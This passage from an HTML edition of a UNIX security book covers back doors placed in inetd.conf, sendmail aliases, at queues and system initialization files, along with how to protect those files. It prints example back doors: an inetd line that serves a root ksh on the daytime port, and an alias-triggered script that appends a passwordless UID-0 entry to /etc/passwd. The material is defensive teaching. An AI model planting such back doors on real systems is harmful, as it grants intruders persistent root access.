can write to the file may change one ofthe entries in the file to start up a shell or other program toaccess the system upon receipt of a message. So, he might change:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">daytime stream tcp nowait root internal</PRE></BLOCKQUOTE><PCLASS="para">to:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">daytime stream tcp nowait root /bin/ksh ksh -i</PRE></BLOCKQUOTE><PCLASS="para">This would allow an attacker to <KBDCLASS="command">telnet</KBD>to the <ICLASS="filename">daytime</I> port on the machine, and get a root shell any timehe wanted to get back on the machine. Note that this would not resultin any unusual program appearing on the system. The only way todiscover this trap is to include the<ICLASS="filename"> inetd.conf</I>file. Obviously, this is a file to include as part of the checklistsprocedure for examining altered files. It is also a file that shouldbe closely guarded.</P><PCLASS="para">Note that even if the command nameslook appropriate for each of the services listed in the <ICLASS="filename">inetd.conf</I>file, if the corresponding files are writable or in a writable directory,the attacker may replace them with altered versions. They wouldnot need to be <SPANCLASS="acronym">SUID/SGID</SPAN> because the <KBDCLASS="command">inetd</KBD> wouldrun them as <ICLASS="filename">root</I> (if so indicated in the file).</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.3">11.5.3.3 /usr/lib/aliases, /etc/aliases,/etc/sendmail/aliases, aliases.dir, oraliases.pag</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15568"></A><ACLASS="indexterm"NAME="AUTOID-15571"></A><ACLASS="indexterm"NAME="AUTOID-15574"></A><ACLASS="indexterm"NAME="AUTOID-15576"></A><ACLASS="indexterm"NAME="AUTOID-15579"></A><ACLASS="indexterm"NAME="AUTOID-15581"></A>Thisis the <ACLASS="indexterm"NAME="AUTOID-15584"></A><ACLASS="indexterm"NAME="AUTOID-15587"></A>file of system-wide electronicmail aliases used by the <KBDCLASS="command">sendmail</KBD> program. Similar files exist forother mailers.</P><PCLASS="para">The danger with this file is that anattacker can create a mail alias that automatically runs a particularprogram. For example, an attacker might add an alias that lookslike this:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">uucheck: &quot;|/usr/lib/uucp/local_uucheck&quot;</PRE></BLOCKQUOTE><PCLASS="para">He might then create a <SPANCLASS="acronym">SUID</SPAN> root file called<ICLASS="filename">/usr/lib/uucp/local_uucheck</I>that essentially performs these operations:[8]</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[8] An actualattacker would make <ICLASS="filename">local_uucheck</I> a compiled program tohide its obvious effect.</P></BLOCKQUOTE><BLOCKQUOTECLASS="screen"><PRECLASS="screen">#!/bin/shecho &quot;uucheck::0:0:fake uucp:/:/bin/sh&quot; &gt;&gt; /etc/passwd</PRE></BLOCKQUOTE><PCLASS="para">The attackernow has a back door into the system. Whenever he sends mail to user<ICLASS="systemitem.username">uucheck,</I> the system will put an entry into the password file thatwill allow the attacker to log in. He can then edit the entry outof the password file, and have free reign on the system. How oftendo you examine your alias file?</P><PCLASS="para">There are other waysof exploiting email programs that do not require the creation of<SPANCLASS="acronym">SUID</SPAN> programs. We have omitted them from thistext for safety, as an astonishingly large number of sites haveworld-writable alias files.</P><PCLASS="para"><EMCLASS="emphasis">Be sure that youralias file is not writable by users </EM>(if for no otherreason than the fact that it gives users an easy way to interceptyour mail). Make certain that no alias runs a program or writesto a file unless you are absolutely 100% certain what theprogram does.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.4">11.5.3.4 The at program</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15609"></A>Most<SPANCLASS="acronym">UNIX</SPAN> systems have a program called <KBDCLASS="command">at</KBD> that allowsusers to specify commands to be run at a later time. This programis especially useful for jobs that only need to be run once, althoughit is also useful on systems that do not have a modern version of<KBDCLASS="command">cron</KBD> that allows users to set their own delayed jobs.</P><PCLASS="para">Theat command collects environment information and commands from theuser and stores them in a file for later execution. The user IDto be used for the script is taken from the queued file. If an attackercan get into the queue directory to modify the file owner or contents,it is possible that the files can be subverted to do something otherthan what was intended. Thus, for obvious reasons, the directorywhere at stores its files should not be writable by others, andthe files it creates should not be writable (or readable) by others.</P><PCLASS="para">Try running <KBDCLASS="command">at</KBD> on your system. If the resulting queuefiles (usually in <ICLASS="filename">/usr/spool/atrun,</I> <ICLASS="filename">/usr/spool/at,</I>or <ICLASS="filename">/var/spool/atrun)</I> can be modifiedby another user, you should fix the situation or consider disablingthe <KBDCLASS="command">atrun</KBD> daemon (usually dispatched by cron every 15 minutes).</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.5">11.5.3.5 System initialization files</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15624"></A><ACLASS="indexterm"NAME="AUTOID-15627"></A><ACLASS="indexterm"NAME="AUTOID-15630"></A><ACLASS="indexterm"NAME="AUTOID-15633"></A>Thesystem initialization files are another ideal place for an attackerto place commands that will allow access to the system. By puttingselected commands in the <ICLASS="filename">/etc/rc*</I>, <ICLASS="filename">/etc/init.d/*,</I><ICLASS="filename">/etc/rc?.d</I>, and other standard files, an attackercould reconstruct a back door into the system whenever the systemis rebooted or the run-level is changed. All the files in <ICLASS="filename">/etc</I>should be kept unwritable by other users!</P><PCLASS="para">Be especiallycareful regarding the <ACLASS="indexterm"NAME="AUTOID-15640"></A><ACLASS="indexterm"NAME="AUTOID-15642"></A><ACLASS="indexterm"NAME="AUTOID-15645"></A>logfiles created by programs automatically run during system initialization.These files can be used to overwrite system files through the useof symlinks.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.6">11.5.3.6 Other files</A></H4><PCLASS="para">Other files may be run ona regular basis, and these should be protected in a similar manner.The programs and data files should be made nonwritable (and perhapsnonreadable) by unprivileged users. All the directories containingthese files and commands up to and including the <ICLASS="filename">root</I> directoryshould be made nonwritable.</P><PCLASS="para">As an added precaution,none of these files or directories (or the ones mentioned earlier)should be exported via <SPANCLASS="acronym">NFS</SPAN> (described in <ACLASS="xref"HREF="ch20_01.htm"TITLE="NFS">Chapter 20, <CITECLASS="chapter">NFS</CITE></A>). If you must export the files via <SPANCLASS="acronym">NFS</SPAN>,export them read-only, and/or set their ownership to <ICLASS="filename">root</I>.</P><PCLASS="para">Note that this presents a possible contradiction: settingfiles to <ICLASS="filename">root</I> that don't need to be set to <ICLASS="filename">root</I> to run.For instance, if you export the <SPANCLASS="acronym">UUCP</SPAN> libraryvia <SPANCLASS="acronym">NFS</SPAN>, you would need to set the files anddirectory to be owned by <ICLASS="filename">root</I> to prevent their modification by anattacker who has subverted one of your <SPANCLASS="acronym">NFS</SPAN> hosts.At the same time, that means that the shell files may be forcedto run as <ICLASS="filename">root</I> instead of as <KBDCLASS="command">uucp</KBD>&nbsp;- otherwise, they won'tbe able to modify some of the files they need to alter!</P><PCLASS="para">Incircumstances such as these, you should export the directories read-onlyand leave the files owned by <KBDCLASS="command">uucp</KBD>. If there is any reason at allto have writable files or subdirectories in what you export,[9] use symbolic links to keep a separatecopy on each system. For instance, you could replace a file in theexported directory via a link to <ICLASS="filename">/local/uucp</I> or<ICLASS="filename">/var/uucp</I> and create a local version on each machine.</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[9] No obvious example comes to mind. We recommend against thinkingof any!</P></BLOCKQUOTE><PCLASS="para">Other files and directories to protect include:</P><ULCLASS="itemizedlist"><LICLASS="listitem"><PCLASS="para">The <SPANCLASS="acronym">NIS/NIS</SPAN>+database and commands (often in <ICLASS="filename">/usr/etc/yp</I>or <ICLASS="filename">/var/nis)</I></P></LI><LICLASS="listitem"><PCLASS="para">The files in <ACLASS="indexterm"NAME="AUTOID-15681"></A><ACLASS="indexterm"NAME="AUTOID-15684"></A><ACLASS="indexterm"NAME="AUTOID-15687"></A><ICLASS="filename">/usr/adm,</I><ICLASS="filename">/var/adm</I>, and <ICLASS="filename">/or /var/log</I>used for accounting and logging</P></LI><LICLASS="listitem"><PCLASS="para">The files in your mailer queue and delivery area(usually <ICLASS="filename">/usr/spool/mqueue</I> and <ICLASS="filename">/usr/spool/mail</I>or linked to those names)</P></LI><LICLASS="listitem"><PCLASS="para">All the files in the libraries <ACLASS="indexterm"NAME="AUTOID-15699"></A><ACLASS="indexterm"NAME="AUTOID-15701"></A><ACLASS="indexterm"NAME="AUTOID-15704"></A>(<ICLASS="filename">/lib, /usr/lib,</I>and <ICLASS="filename">/usr/local/lib</I>)</P></LI></UL><PCLASS="para">No files that are used aspart of your system's start-up procedure or for other automaticoperations should be exported via <SPANCLASS="acronym">NFS</SPAN>. If thesefiles must be exported using <SPANCLASS="acronym">NFS</SPAN>, they shouldbe set on the server to be owned by root and placed in a directorythat is owned by root. Do not export files or directories for <SPANCLASS="acronym">UUCP</SPAN>or other subsystems that require ownership by users other than root.<ACLASS="indexterm"NAME="AUTOID-15713"></A></P></DIV></DIV></DIV><DIVCLASS="htmlnav"><P></P><HRALIGN="LEFT"WIDTH="515"TITLE="footer"><TABLEWIDTH="515"BORDER="0"CELLSPACING="0"CELLPADDING="0"><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch11_04.htm"TITLE="11.4 Entry"><IMGSRC="../gifs/txtpreva.gif"ALT="Previous: 11.4 Entry"BORDER="0"></A></TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><ACLASS="book"HREF="index.htm"TITLE="Practical UNIX &amp; Internet Security"><IMGSRC="../gifs/txthome.gif"ALT="Practical UNIX &amp; Internet Security"BORDER="0"></A></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch11_06.htm"TITLE="11.6 Protecting Your System"><IMGSRC="../gifs/txtnexta.gif"ALT="Next: 11.6 Protecting Your System"BORDER="0"></A></TD></TR><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172">11.4 Entry</TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><ACLASS="index"HREF="index/idx_0.htm"TITLE="Book Index"><IMGSRC="../gifs/index.gif"ALT="Book Index"BORDER="0"></A></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172">11.6 Protecting Your System</TD></TR></TABLE><HRALIGN="LEFT"WIDTH="515"TITLE="footer"><PCLASS="nav"><FONTSIZE="-1">[ <AHREF="../index.htm"TITLE="The Networking CD Bookshelf">Library Home</A> | <AHREF="../dnsbind/index.htm"TITLE="DNS &amp; BIND">DNS &amp; BIND</A> | <AHREF="../tcpip/index.htm"TITLE="TCP/IP Network Administration">TCP/IP</A> | <AHREF="../sendmail/index.htm"TITLE="sendmail">sendmail</A> | <AHREF="../smdref/index.htm"TITLE="sendmail Desktop Reference">sendmail Reference</A> | <AHREF="../firewall/index.htm"TITLE="Building Internet Firewalls">Firewalls</A> | <AHREF="index.htm"TITLE="Practical UNIX &amp; Internet Security">Practical Security</A> ]</FONT></P></DIV></BODY></HTML>